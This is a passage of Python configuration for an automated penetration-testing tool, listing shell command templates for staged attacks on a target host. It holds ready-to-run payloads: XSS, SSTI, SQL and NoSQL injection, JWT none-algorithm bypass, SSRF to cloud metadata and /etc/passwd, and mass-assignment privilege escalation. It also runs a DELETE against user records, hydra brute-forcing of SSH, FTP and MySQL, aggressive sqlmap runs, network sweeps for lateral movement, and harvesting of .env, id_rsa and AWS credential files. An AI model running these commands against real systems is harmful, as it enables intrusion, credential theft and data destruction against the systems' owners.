                "cmd_template": "echo '---SESSION HEADERS---'; curl -skI --max-time 8 'http://{target}/login' 2>&1 | grep -iE 'set-cookie|www-auth|x-frame|x-xss|strict-transport|content-security' | head -15; echo '---BASIC AUTH PROBE---'; anon=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/' 2>/dev/null); echo \"anon=$anon\"; curl -sku admin:admin --max-time 8 -o /dev/null -w 'admin:admin=%{http_code}\\n' 'http://{target}/' 2>&1; curl -sku admin:password --max-time 8 -o /dev/null -w 'admin:password=%{http_code}\\n' 'http://{target}/' 2>&1; curl -sku root:root --max-time 8 -o /dev/null -w 'root:root=%{http_code}\\n' 'http://{target}/' 2>&1; echo '---FTP ANON---'; curl -s --max-time 8 ftp://{target}/ 2>&1 | head -10; echo '---SSH VERSION---'; nc -w 4 {target} 22 2>&1 | head -3",
                "parse": "auth_probe",
            },
            {
                "id": "deep_service_proto", "label": "Protocol-Level Anomaly", "tool": "nmap NSE deep",
                "description": "DNS recursion, NTP monlist, SMTP open relay, LDAP anon bind, Redis/MongoDB unauth.",
                "cmd_template": "nmap --script=dns-recursion,ntp-monlist,smtp-open-relay,ldap-rootdse,ftp-anon,ftp-bounce,redis-info,mongodb-info -p 25,53,110,123,389,443,636,6379,27017 -T4 {target} 2>&1 | head -80",
                "parse": "nse_deep",
            },{
                "id": "deep_xss_probe", "label": "XSS & Injection Surface Probe", "tool": "dalfox / curl",
                "description": "Reflected XSS, open redirect, XXE, SSTI and DOM injection probes across common parameters.",
                "cmd_template": "echo '---XSS REFLECT---'; for p in q search id name input; do code=$(curl -skL -o /dev/null -w '%{http_code}' http://{target}/?$p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E 2>/dev/null); body=$(curl -skL http://{target}/?$p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E 2>/dev/null | grep -oi 'onerror\\|alert' | head -1); echo $p' XSS '${code}': '$body; done; echo '---OPEN REDIRECT---'; for p in next redirect url return dest; do r=$(curl -skI http://{target}/?$p=https://evil.com 2>/dev/null | grep -i 'location.*evil' | head -1); echo $p': '$r; done; echo '---XXE PROBE---'; curl -sk -X POST -H 'Content-Type: application/xml' --data-binary '<root></root>' http://{target}/ -o - 2>&1 | grep -iE 'root:|xxe|entity' | head -3; echo '---SSTI PROBE---'; curl -sk http://{target}/?name=%7B%7B7*7%7D%7D -o - 2>&1 | grep -o '49' | head -2; echo '---DALFOX---'; if command -v dalfox >/dev/null 2>&1; then dalfox url http://{target}/ --silence --no-spinner 2>&1 | head -20; else echo '[dalfox not installed — skipped]'; fi",
                "fallback_cmd": "echo '---XSS CHECK---'; for p in q search id; do curl -sk http://{target}/?$p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E -o - 2>&1 | grep -oi 'alert' | head -1; done",
                "parse": "xss_probe",
            },
            {
                "id": "deep_cms_scan", "label": "CMS & Framework Detection", "tool": "wpscan / droopescan",
                "description": "Detect WordPress, Drupal, Joomla, Laravel, Django, Rails installs. Enumerate plugins, themes, users.",
                "cmd_template": "echo '---WP DETECT---'; wb=$(curl -sk --max-time 8 'http://{target}/wp-login.php' 2>/dev/null | tr '\\n' ' ' | head -c 200); wc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/wp-login.php' 2>/dev/null); echo \"wp-login:$wc|$wb\"; curl -sk --max-time 8 'http://{target}/wp-json/wp/v2/users' -o - 2>&1 | head -5; echo '---WPSCAN---'; wpscan --url http://{target} --enumerate vp,u,m --no-update 2>&1 | head -60; echo '---DRUPAL---'; curl -sk --max-time 8 'http://{target}/CHANGELOG.txt' -o - 2>&1 | head -5; db=$(curl -sk --max-time 8 'http://{target}/user/login' 2>/dev/null | tr '\\n' ' ' | head -c 200); dc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/user/login' 2>/dev/null); echo \"drupal_login:$dc|$db\"; echo '---JOOMLA---'; jb=$(curl -sk --max-time 8 'http://{target}/administrator/' 2>/dev/null | tr '\\n' ' ' | head -c 200); jc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/administrator/' 2>/dev/null); echo \"joomla_admin:$jc|$jb\"",
                "fallback_cmd": "wb=$(curl -sk --max-time 8 'http://{target}/wp-login.php' 2>/dev/null | tr '\\n' ' ' | head -c 200); wc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/wp-login.php' 2>/dev/null); echo \"wp-login:$wc|$wb\"; curl -sk --max-time 8 'http://{target}/CHANGELOG.txt' -o - 2>&1 | head -5",
                "parse": "cms_scan",
            },
        ],
    },
    {
        "id": "api_scan", "label": "Stage 4 — API Vulnerability Scan",
        "color": "cyan", "icon": "04", "parallel": True,
        "substages": [
            {
                "id": "api_discovery", "label": "API Endpoint Discovery", "tool": "curl / gobuster",
                "description": "Discover REST/GraphQL endpoints, API versioning, swagger/openapi docs, and common API paths.",
                "cmd_template": "echo '---API PATHS---'; for p in /api /api/v1 /api/v2 /api/v3 /v1 /v2 /graphql /swagger /swagger-ui /swagger.json /openapi.json /api-docs /rest /ws /wsdl /.well-known /health /metrics /actuator /actuator/env /actuator/mappings; do out=$(curl -skL --max-time 8 -w '%{http_code}' -o /tmp/pwm_apid_$$ 'http://{target}'$p 2>/dev/null); body=$(tr '\\n' ' ' < /tmp/pwm_apid_$$ 2>/dev/null | head -c 180); rm -f /tmp/pwm_apid_$$; echo \"$p:$out|$body\"; done; echo '---GRAPHQL INTROSPECT---'; curl -sk --max-time 8 -X POST -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}' http://{target}/graphql 2>&1 | head -20",
                "parse": "api_discovery",
            },
            {
                "id": "api_bola", "label": "BOLA / IDOR Testing", "tool": "curl probes",
                "description": "Broken Object Level Authorization — test ID enumeration across common API object endpoints.",
                "cmd_template": "echo '---BOLA/IDOR PROBES---'; for id in 1 2 3 100 999 0 -1; do echo \"=== id=$id ===\"; curl -sk 'http://{target}/api/v1/users/'$id -o - 2>&1 | head -5; curl -sk 'http://{target}/api/users/'$id -o - 2>&1 | head -5; curl -sk 'http://{target}/api/v1/orders/'$id -o - 2>&1 | head -5; done; echo '---UUID PROBE---'; curl -sk 'http://{target}/api/v1/users/00000000-0000-0000-0000-000000000001' -o - 2>&1 | head -5",
                "parse": "api_bola",
            },
            {
                "id": "api_auth", "label": "Broken Authentication Probe", "tool": "curl probes",
                "description": "Test JWT weaknesses, missing auth on endpoints, token reuse, and brute-force protection.",
                "cmd_template": "echo '---NO AUTH---'; anon=$(curl -sk --max-time 8 'http://{target}/api/v1/admin' -o /dev/null -w '%{http_code}' 2>/dev/null); echo \"anon:$anon|\"; curl -sk --max-time 8 'http://{target}/api/v1/users' -o /dev/null -w 'users: %{http_code}\\n' 2>/dev/null; curl -sk --max-time 8 'http://{target}/api/v1/config' -o /dev/null -w 'config: %{http_code}\\n' 2>/dev/null; echo '---JWT NONE ALG---'; curl -sk --max-time 8 -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.' 'http://{target}/api/v1/admin' -o /dev/null -w 'jwt_none: %{http_code}\\n' 2>/dev/null; echo '---NULL TOKEN---'; curl -sk --max-time 8 -H 'Authorization: Bearer null' 'http://{target}/api/v1/users' -o /dev/null -w 'null_token: %{http_code}\\n' 2>/dev/null; echo '---NO TOKEN---'; curl -sk --max-time 8 'http://{target}/api/v1/profile' -o - 2>&1 | head -5",
                "parse": "api_auth",
            },
            {
                "id": "api_injection", "label": "API Injection Testing", "tool": "curl probes",
                "description": "SQL injection, NoSQL injection, command injection and SSTI via API parameters.",
                "cmd_template": "echo '---SQL INJECT---'; curl -sk --max-time 8 'http://{target}/api/v1/users?id=1%27' -o - 2>&1 | head -8; curl -sk --max-time 8 'http://{target}/api/v1/search?q=test%27+OR+1%3D1--' -o - 2>&1 | head -8; echo '---NOSQL INJECT---'; curl -sk --max-time 8 -X POST -H 'Content-Type: application/json' -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}' 'http://{target}/api/login' 2>&1 | head -8; curl -sk --max-time 8 -X POST -H 'Content-Type: application/json' -d '{{\"username\":{{\"$ne\":null}},\"password\":{{\"$ne\":null}}}}' 'http://{target}/api/v1/login' 2>&1 | head -8; echo '---SSTI PROBE---'; echo \"SSTI_RESULT:$(curl -sk --max-time 8 'http://{target}/api/v1/search?q={{7*7}}' -o - 2>&1 | head -c 80 | tr '\\n' ' ')\"; echo \"SSTI_RESULT:$(curl -sk --max-time 8 'http://{target}/api/v1/render?template={{7*7}}' -o - 2>&1 | head -c 80 | tr '\\n' ' ')\"",
                "parse": "api_injection",
            },
            {
                "id": "api_ssrf", "label": "SSRF Detection", "tool": "curl probes",
                "description": "Server-Side Request Forgery — test URL parameters for internal service access.",
                "cmd_template": "echo '---SSRF PROBES---'; for param in url redirect next return callback dest destination link; do base=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' \"http://{target}/api/v1/fetch?$param=0\" 2>/dev/null); imds=$(curl -skL --max-time 8 -w '%{http_code}' -o /tmp/pwm_ssrf_$$ \"http://{target}/api/v1/fetch?$param=http://169.254.169.254/latest/meta-data/\" 2>/dev/null); ibody=$(tr '\\n' ' ' < /tmp/pwm_ssrf_$$ 2>/dev/null | head -c 120); rm -f /tmp/pwm_ssrf_$$; local=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' \"http://{target}/api/v1/proxy?$param=http://127.0.0.1:22\" 2>/dev/null); echo \"$param=baseline:$base|imds:$imds|$ibody|local22:$local\"; done; echo '---FILE SSRF---'; curl -skL --max-time 8 'http://{target}/api/v1/fetch?url=file:///etc/passwd' -o - 2>&1 | head -5",
                "parse": "api_ssrf",
            },
            {
                "id": "api_mass_assign", "label": "Mass Assignment / Overpost", "tool": "curl probes",
                "description": "Broken Object Property Level Auth — test for mass assignment and privilege escalation via API body.",
                "cmd_template": "echo '---MASS ASSIGN---'; curl -sk --max-time 8 -X PUT -H 'Content-Type: application/json' -d '{{\"role\":\"admin\",\"is_admin\":true,\"admin\":true,\"privilege\":\"admin\"}}' 'http://{target}/api/v1/users/1' -o - 2>&1 | head -8; curl -sk --max-time 8 -X PATCH -H 'Content-Type: application/json' -d '{{\"role\":\"superuser\",\"verified\":true,\"credits\":99999}}' 'http://{target}/api/v1/profile' -o - 2>&1 | head -8; echo '---FUNC LEVEL---'; del=$(curl -sk --max-time 8 -X DELETE 'http://{target}/api/v1/users/1' -o /dev/null -w '%{http_code}' 2>/dev/null); echo \"DELETE user:$del|\"; au=$(curl -sk --max-time 8 'http://{target}/api/v1/admin/users' 2>/dev/null | tr '\\n' ' ' | head -c 180); auc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/api/v1/admin/users' 2>/dev/null); echo \"admin/users:$auc|$au\"; idb=$(curl -sk --max-time 8 'http://{target}/api/v1/internal/debug' 2>/dev/null | tr '\\n' ' ' | head -c 180); idc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/api/v1/internal/debug' 2>/dev/null); echo \"internal/debug:$idc|$idb\"",
                "parse": "api_mass_assign",
            },
            {
                "id": "api_misc", "label": "API Misconfiguration & Rate Limit", "tool": "curl probes",
                "description": "Security misconfigs, missing rate limiting, CORS, verbose errors, third-party API exposure.",
                "cmd_template": "echo '---CORS---'; curl -skL -H 'Origin: https://evil.com' -I 'http://{target}/api/v1/users' 2>&1 | grep -i 'access-control'; echo '---RATE LIMIT TEST---'; for i in $(seq 1 15); do curl -sk -o /dev/null -w '%{http_code} ' 'http://{target}/api/v1/login' -d 'user=admin&pass=test'; done; echo ''; echo '---VERBOSE ERROR---'; curl -sk 'http://{target}/api/v1/users/INVALID_ID' -o - 2>&1 | head -10; curl -sk -X POST -H 'Content-Type: application/json' -d '{{\"bad\":\"json\"' 'http://{target}/api/v1/users' -o - 2>&1 | head -10; echo '---THIRD PARTY KEYS---'; curl -sk 'http://{target}/api/v1/config' -o - 2>&1 | grep -iE 'api_key|secret|token|password|key|credential' | head -10",
                "parse": "api_misc",
            },
        ],
    },
    {
        "id": "db_scan", "label": "Stage 5 — Database Vulnerability Scan",
        "color": "purple", "icon": "05", "parallel": True,
        "substages": [
            {
                "id": "db_discovery", "label": "Database Service Discovery", "tool": "nmap",
                "description": "Detect exposed database services: MySQL, PostgreSQL, MongoDB, Redis, MSSQL, Oracle, Cassandra, Elasticsearch, InfluxDB, Neo4j.",
                "cmd_template": "nmap -sV -p 1433,1521,3306,5432,5984,6379,7474,8086,8529,9042,9200,9300,11211,27017,27018,28015,50000 --open -T4 --script=banner {target} 2>&1",
                "parse": "db_discovery",
            },
            {
                "id": "db_unauth", "label": "Unauthenticated DB Access", "tool": "nmap NSE / curl / redis-cli",
                "description": "Test for unauthenticated access to all exposed database services.",
                "cmd_template": "echo '---REDIS UNAUTH---'; redis-cli -h {target} -p 6379 --no-auth-warning ping 2>&1 | head -5; redis-cli -h {target} -p 6379 --no-auth-warning info server 2>&1 | head -10; redis-cli -h {target} -p 6379 --no-auth-warning CONFIG GET requirepass 2>&1 | head -5; echo '---MONGODB UNAUTH---'; curl -sk 'http://{target}:27017' -o - 2>&1 | head -5; nmap --script=mongodb-info,mongodb-databases -p 27017 {target} 2>&1 | head -30; echo '---ELASTICSEARCH---'; curl -sk 'http://{target}:9200/_cat/indices?v' 2>&1 | head -20; curl -sk 'http://{target}:9200/_cluster/health' 2>&1 | head -10; curl -sk 'http://{target}:9200/_nodes' 2>&1 | head -15; echo '---COUCHDB---'; curl -sk 'http://{target}:5984/_all_dbs' 2>&1 | head -5; echo '---INFLUXDB---'; curl -sk 'http://{target}:8086/query?q=SHOW+DATABASES' 2>&1 | head -5; echo '---MEMCACHED---'; nmap --script=memcached-info -p 11211 {target} 2>&1 | head -20",
                "parse": "db_unauth",
            },
            {
                "id": "db_default_creds", "label": "Default DB Credentials", "tool": "nmap NSE / hydra",
                "description": "Test default credentials for MySQL, PostgreSQL, MSSQL, MongoDB, Redis, Oracle.",
                "cmd_template": "echo '---MYSQL DEFAULT---'; nmap --script=mysql-empty-password,mysql-databases,mysql-users -p 3306 {target} 2>&1 | head -30; echo '---MSSQL DEFAULT---'; nmap --script=ms-sql-empty-password,ms-sql-info,ms-sql-config -p 1433 {target} 2>&1 | head -30; echo '---MYSQL ROOT NOPASS---'; mysqladmin -h {target} -u root status 2>&1 | head -5; echo '---POSTGRES---'; PGPASSWORD='' psql -h {target} -U postgres -c '\\l' 2>&1 | head -10; echo '---HYDRA MYSQL---'; WP=/usr/share/wordlists/metasploit/unix_passwords.txt; [ -f \"$WP\" ] || WP=/usr/share/wordlists/fasttrack.txt; if [ -f \"$WP\" ]; then hydra -l root -P \"$WP\" -t 4 -f {target} mysql 2>&1 | tail -10; else echo '[wordlist missing — hydra skipped]'; fi",
                "fallback_cmd": "nmap --script=mysql-empty-password,mysql-databases,mysql-users -p 3306 {target} 2>&1 | head -30; nmap --script=ms-sql-empty-password,ms-sql-info -p 1433 {target} 2>&1 | head -20",
                "parse": "db_default_creds",
            },
            {
                "id": "db_sqlmap", "label": "sqlmap — Deep SQL Injection Audit", "tool": "sqlmap",
                "description": "Automated SQL injection detection and database fingerprinting using sqlmap across GET/POST parameters and forms. Detection and enumeration only.",
                "cmd_template": "echo '---SQLMAP GET PARAMS---'; sqlmap -u 'http://{target}/?id=1' --batch --level=3 --risk=2 --technique=BEUST --threads=5 --dbs --banner --current-user --current-db --output-dir={outdir}/sqlmap_get 2>&1 | tail -40; echo '---SQLMAP FORMS---'; sqlmap -u 'http://{target}/' --forms --batch --level=3 --risk=2 --technique=BEUST --threads=5 --dbs --output-dir={outdir}/sqlmap_forms 2>&1 | tail -30; echo '---SQLMAP LOGIN---'; sqlmap -u 'http://{target}/login' --data='username=admin&password=test' --batch --level=3 --risk=2 --technique=BEUST --output-dir={outdir}/sqlmap_login 2>&1 | tail -20; echo '---SQLMAP SEARCH---'; sqlmap -u 'http://{target}/search?q=test' --batch --level=3 --risk=2 --technique=BEUST --output-dir={outdir}/sqlmap_search 2>&1 | tail -20",
                "fallback_cmd": "echo '[sqlmap not installed] apt-get install sqlmap'",
                "parse": "sqlmap",
            },
            {
                "id": "db_sqli", "label": "Manual SQL Injection Probes", "tool": "curl / nmap NSE",
                "description": "Error-based, time-based, boolean-based and union-based SQL injection probes.",
                "cmd_template": "echo '---ERROR BASED SQLi---'; for payload in \"'\" \"''\" \"' OR '1'='1\" \"' OR 1=1--\" \"1; SELECT 1\" \"1 UNION SELECT NULL--\" \"1 AND 1=2\"; do encoded=$(python3 -c \"import urllib.parse; print(urllib.parse.quote('$payload'))\" 2>/dev/null || echo '%27'); resp=$(curl -sk \"http://{target}/?id=$encoded\" -o - 2>&1 | grep -iE 'sql|mysql|syntax|error|warning|ORA-' | head -2); echo \"PAYLOAD[$payload]: $resp\"; done; echo '---TIME BASED---'; t1=$(curl -sk -o /dev/null -w '%{time_total}' \"http://{target}/?id=1+AND+SLEEP(4)\" 2>/dev/null); t2=$(curl -sk -o /dev/null -w '%{time_total}' \"http://{target}/?id=1\" 2>/dev/null); echo \"sleep_probe=${t1}s baseline=${t2}s\"; echo '---POST SQLI---'; curl -sk -X POST -d \"username='&password=test\" 'http://{target}/login' -o - 2>&1 | head -5",
                "parse": "db_sqli",
            },
            {
                "id": "db_nosql", "label": "NoSQL Injection Detection", "tool": "curl probes",
                "description": "MongoDB, Redis and Cassandra operator injection, authentication bypass.",
                "cmd_template": "echo '---NOSQL OPERATOR INJECT---'; curl -sk -X POST -H 'Content-Type: application/json' -d '{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}' 'http://{target}/login' -o - 2>&1 | head -8; curl -sk -X POST -H 'Content-Type: application/json' -d '{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}' 'http://{target}/api/login' -o - 2>&1 | head -8; curl -sk -X POST -H 'Content-Type: application/json' -d '{\"$where\":\"1==1\"}' 'http://{target}/api/v1/users' -o - 2>&1 | head -8; echo '---REDIS CMD INJECT---'; redis-cli -h {target} -p 6379 --no-auth-warning CONFIG GET requirepass 2>&1 | head -5; redis-cli -h {target} -p 6379 --no-auth-warning KEYS '*' 2>&1 | head -20",
                "parse": "db_nosql",
            },
            {
                "id": "db_privesc", "label": "DB Privilege & Config Audit", "tool": "nmap NSE / curl",
                "description": "Excessive privileges, verbose errors, missing encryption, audit logging, stored procedures.",
                "cmd_template": "echo '---MYSQL PRIVS---'; nmap --script=mysql-info,mysql-variables,mysql-audit -p 3306 {target} 2>&1 | head -50; echo '---POSTGRES INFO---'; nmap --script=pgsql-info -p 5432 {target} 2>&1 | head -30; echo '---MSSQL INFO---'; nmap --script=ms-sql-info,ms-sql-config,ms-sql-xp-cmdshell -p 1433 {target} 2>&1 | head -40; echo '---ELASTIC SECURITY---'; curl -sk 'http://{target}:9200/_xpack/security?pretty' 2>&1 | head -10; echo '---VERBOSE DB ERRORS---'; curl -sk http://{target}/?id=1%27 -o - 2>&1 | grep -iE 'sql|mysql|syntax error|ora-' | head -10",
                "parse": "db_privesc",
            },
            {
                "id": "db_second_order", "label": "Second-Order SQLi & Stored Payloads", "tool": "sqlmap / curl",
                "description": "Detect second-order SQL injection by registering payloads and observing trigger points.",
                "cmd_template": "echo '---REGISTER PAYLOAD---'; curl -sk -X POST -H 'Content-Type: application/json' -d \"{\\\"username\\\":\\\"admin' OR 1=1--\\\",\\\"email\\\":\\\"test@test.com\\\",\\\"password\\\":\\\"test123\\\"}\" 'http://{target}/api/v1/register' -o - 2>&1 | head -5; echo '---CHECK PROFILE---'; curl -sk 'http://{target}/profile' -o - 2>&1 | grep -iE 'sql|error|syntax' | head -5; echo '---SQLMAP CRAWL---'; sqlmap -u 'http://{target}/' --crawl=2 --batch --level=2 --risk=1 --technique=B --output-dir={outdir}/sqlmap_crawl 2>&1 | tail -20",
                "fallback_cmd": "echo '---SECOND ORDER PROBE---'; curl -sk -X POST -d \"username=admin'--&password=test\" 'http://{target}/register' -o - 2>&1 | head -5",
                "parse": "db_sqli",
            },
        ],
    },
    {
        "id": "exploit_prep", "label": "Stage 6 — Exploitation Prep",
        "color": "coral", "icon": "06", "parallel": False,
        "substages": [
            {
                "id": "ep_hydra", "label": "Default Credential Test", "tool": "hydra",
                "description": "Top-50 default credentials against SSH, FTP, HTTP-Auth, MySQL, RDP.",
                "cmd_template": "WU=/usr/share/wordlists/metasploit/unix_users.txt; WP=/usr/share/wordlists/metasploit/unix_passwords.txt; [ -f \"$WU\" ] || WU=/usr/share/wordlists/fasttrack.txt; [ -f \"$WP\" ] || WP=/usr/share/wordlists/fasttrack.txt; if [ ! -f \"$WU\" ] || [ ! -f \"$WP\" ]; then echo '[wordlists missing — hydra skipped]'; else echo '---SSH BRUTE---'; hydra -L \"$WU\" -P \"$WP\" -t 6 -T 15 -f {target} ssh 2>&1 | tail -20; echo '---FTP BRUTE---'; hydra -L \"$WU\" -P \"$WP\" -t 4 -f {target} ftp 2>&1 | tail -10; echo '---MYSQL BRUTE---'; hydra -l root -P \"$WP\" -t 4 -f {target} mysql 2>&1 | tail -10; fi",
                "fallback_cmd": "WU=/usr/share/wordlists/metasploit/unix_users.txt; WP=/usr/share/wordlists/metasploit/unix_passwords.txt; [ -f \"$WU\" ] || WU=/usr/share/wordlists/fasttrack.txt; [ -f \"$WP\" ] || WP=/usr/share/wordlists/fasttrack.txt; if [ -f \"$WU\" ] && [ -f \"$WP\" ]; then hydra -L \"$WU\" -P \"$WP\" -t 6 -T 15 -f {target} ssh 2>&1 | tail -30; else echo '[wordlists missing — hydra skipped]'; fi",
                "parse": "hydra",
            },
            {
                "id": "ep_msf_check", "label": "Metasploit Safe Check", "tool": "msfconsole",
                "description": "Non-destructive check — confirms vulnerability without exploitation.",
                "cmd_template": "if command -v msfconsole >/dev/null 2>&1; then msfconsole -q -x 'db_nmap -sV -p {ports} {target}; vulns; hosts; services; exit' 2>&1 | grep -vE '^\\[\\*\\] exec|msf6>' | tail -50; else echo '[msfconsole not installed — skipped]'; fi",
                "fallback_cmd": "echo '[msfconsole not installed or timed out — skipped]'",
                "parse": "msf",
            },
            {
                "id": "ep_sqli_verify", "label": "sqlmap Injection Verification", "tool": "sqlmap",
                "description": "Verify and enumerate confirmed SQL injection points. Banner, DBMS, current user, databases.",
                "cmd_template": "timeout -k 5 1200 sqlmap -u 'http://{target}/?id=1' --batch --level=5 --risk=3 --technique=BEUSTQ --threads=10 --timeout=10 --retries=1 --banner --current-user --current-db --hostname --dbs --output-dir={outdir}/sqlmap_verify 2>&1 | tail -60",
                "fallback_cmd": "echo '[sqlmap not installed] apt-get install sqlmap'",
                "parse": "sqlmap",
            },
            {
                "id": "ep_vuln_verify", "label": "CVE / Exploit Verification", "tool": "searchsploit",
                "description": "Cross-reference all discovered service versions against ExploitDB. List applicable modules.",
                "cmd_template": "searchsploit --colour {banner_search} 2>&1 | head -40",
                "parse": "searchsploit",
            },
            {
                "id": "ep_payload_ref", "label": "Payload Reference List", "tool": "msfvenom",
                "description": "Applicable payload types for identified OS. Reference only — no payload generated.",
                "cmd_template": "msfvenom --list payloads 2>&1 | grep -iE 'windows/x64/meterpreter|linux/x64/meterpreter|python/meterpreter|java/meterpreter|php/meterpreter|cmd/unix' | head -25",
                "parse": "generic",
            },
        ],
    },
    {
        "id": "postex", "label": "Stage 7 — Post-Exploitation Review",
        "color": "purple", "icon": "07", "parallel": True,
        "substages": [
            {
                "id": "pe_network_map", "label": "Network Segment Discovery", "tool": "nmap / arp-scan",
                "description": "Discover additional hosts on adjacent subnet, identify live hosts for lateral movement.",
                "cmd_template": "nmap -sn {network} --min-rate 2000 -T4 2>&1 | head -60; echo '---ARP SCAN---'; arp-scan --localnet 2>&1 | head -40",
                "fallback_cmd": "nmap -sn {network} --min-rate 2000 -T4 2>&1 | head -60",
                "parse": "nmap",
            },
            {
                "id": "pe_privesc_ref", "label": "Privilege Escalation Vectors", "tool": "searchsploit / linux-exploit-suggester",
                "description": "Known kernel/sudo/SUID escalation paths for target OS version.",
                "cmd_template": "searchsploit linux kernel local privilege escalation 2>&1 | head -25; echo '---SUDO---'; searchsploit sudo local privilege 2>&1 | head -15; echo '---DIRTY COW---'; searchsploit 'dirty cow' 2>&1 | head -10; echo '---POLKIT---'; searchsploit polkit 2>&1 | head -10; echo '---SUDO MISCONFIG CHECK---'; nmap --script=ssh-run --script-args='ssh-run.cmd=sudo -l,ssh-run.username=,ssh-run.password=' -p 22 {target} 2>&1 | head -20",
                "fallback_cmd": "searchsploit linux kernel local privilege escalation 2>&1 | head -25",
                "parse": "searchsploit",
            },
            {
                "id": "pe_hv_targets", "label": "High-Value Service Map", "tool": "nmap",
                "description": "Probe for databases, Active Directory, backup services, secret stores, cloud metadata.",
                "cmd_template": "nmap -sV -p 88,389,636,445,1433,1521,3306,5432,6379,9200,27017,5985,5986 --open -T4 {target} 2>&1; echo '---CLOUD METADATA---'; curl -sk 'http://169.254.169.254/latest/meta-data/' 2>&1 | head -10; curl -sk 'http://169.254.169.254/computeMetadata/v1/' -H 'Metadata-Flavor: Google' 2>&1 | head -10",
                "parse": "nmap",
            },
            {
                "id": "pe_cred_harvest", "label": "Credential & Secret Harvesting", "tool": "curl / nmap",
                "description": "Search for exposed credentials, keys, tokens in common paths and service responses.",
                "cmd_template": "echo '---SECRET PATHS---'; for p in .env .env.local wp-config.php config.php config/database.yml application.properties secrets.yaml backup.sql database.sql id_rsa .git/config .aws/credentials; do out=$(curl -skL --max-time 8 -w '%{http_code}' -o /tmp/pwm_cred_$$ 'http://{target}/'$p 2>/dev/null); body=$(tr '\\n' ' ' < /tmp/pwm_cred_$$ 2>/dev/null | head -c 200); rm -f /tmp/pwm_cred_$$; echo \"$p:$out|$body\"; done; echo '---GIT EXPOSURE---'; curl -skL --max-time 8 http://{target}/.git/COMMIT_EDITMSG -o - 2>&1 | head -5; curl -skL --max-time 8 http://{target}/.git/config -o - 2>&1 | head -10",
                "parse": "cred_harvest",
            },
            {
                "id": "pe_ad_enum", "label": "Active Directory Enumeration", "tool": "nmap / ldapsearch",
                "description": "Enumerate AD domain controllers, Kerberos, LDAP, SYSVOL, GPO, trust relationships.",
                "cmd_template": "echo '---AD PORTS---'; nmap -sV -p 88,389,445,464,636,3268,3269 --script=krb5-enum-users,ldap-rootdse,smb-security-mode {target} 2>&1 | head -60; echo '---LDAP ANON BIND---'; ldapsearch -x -H ldap://{target} -b '' -s base '(objectclass=*)' 2>&1 | head -20; echo '---KERBEROS---'; nmap --script=krb5-enum-users --script-args krb5-enum-users.realm={target} -p 88 {target} 2>&1 | head -20",
                "fallback_cmd": "nmap -sV -p 88,389,445,636 --script=ldap-rootdse {target} 2>&1 | head -40",
                "parse": "nse_deep",
            },
        ],
    },
]


# ─────────────────────────────────────────────────────────────────────────────
# VERSION DATABASE & ANOMALY SIGNATURES (unchanged from v2)
# ─────────────────────────────────────────────────────────────────────────────
VERSION_DB = {
    "openssh":      {"latest":"9.7",  "eol":"7.4",   "cve_prefix":"CVE-2023-"},
    "apache":       {"latest":"2.4.59","eol":"2.4.49","cve_prefix":"CVE-2021-"},
    "nginx":        {"latest":"1.26", "eol":"1.18",  "cve_prefix":"CVE-2022-"},
    "vsftpd":       {"latest":"3.0.5","eol":"2.3.4", "cve_prefix":"CVE-2011-"},
    "proftpd":      {"latest":"1.3.8","eol":"1.3.5", "cve_prefix":"CVE-2019-"},
    "openssl":      {"latest":"3.3",  "eol":"1.0.2", "cve_prefix":"CVE-2022-"},
    "php":          {"latest":"8.3",  "eol":"7.4",   "cve_prefix":"CVE-2023-"},
    "mysql":        {"latest":"8.4",  "eol":"5.7",   "cve_prefix":"CVE-2023-"},
    "postgresql":   {"latest":"16",   "eol":"11",    "cve_prefix":"CVE-2023-"},
    "samba":        {"latest":"4.20", "eol":"4.9",   "cve_prefix":"CVE-2022-"},
    "iis":          {"latest":"10",   "eol":"7.5",   "cve_prefix":"CVE-2021-"},
    "tomcat":       {"latest":"10.1", "eol":"8.5",   "cve_prefix":"CVE-2023-"},
    "exim":         {"latest":"4.97", "eol":"4.89",  "cve_prefix":"CVE-2023-"},
    "bind":         {"latest":"9.18", "eol":"9.11",  "cve_prefix":"CVE-2023-"},
    "redis":        {"latest":"7.2",  "eol":"5.0",   "cve_prefix":"CVE-2023-"},
    "mongodb":      {"latest":"7.0",  "eol":"4.2",   "cve_prefix":"CVE-2022-"},
    "elasticsearch":{"latest":"8.13", "eol":"6.8",   "cve_prefix":"CVE-2023-"},
    "jenkins":      {"latest":"2.459","eol":"2.332", "cve_prefix":"CVE-2024-"},
}

ANOMALY_SIGNATURES = [
    (r"X-Powered-By:\s*PHP/[34567]\.", "Outdated PHP in X-Powered-By header", "high"),
    (r"Server:\s*Apache/2\.4\.4[0-9]", "Apache in EOL/critical CVE range (CVE-2021-41773)", "critical"),
    (r"Server:\s*nginx/1\.1[0-8]\.", "Outdated nginx — multiple known CVEs", "high"),
    (r"Server:\s*Microsoft-IIS/[567]\.", "EOL IIS version — no security patches", "critical"),
    (r"Access-Control-Allow-Origin:\s*\*", "CORS wildcard — data exfiltration vector", "medium"),
    (r"(?i)set-cookie:(?!.*httponly)", "Cookie missing HttpOnly flag", "medium"),
    (r"(?i)set-cookie:(?!.*secure)", "Cookie missing Secure flag", "medium"),
    (r"Windows\s+[56789]\.0", "Legacy Windows OS — EternalBlue likely", "critical"),
    (r"Samba\s+[234]\.", "Outdated Samba — SambaCry risk", "high"),
    (r"220.*FTP.*[Aa]nonymous", "Anonymous FTP login accepted", "high"),
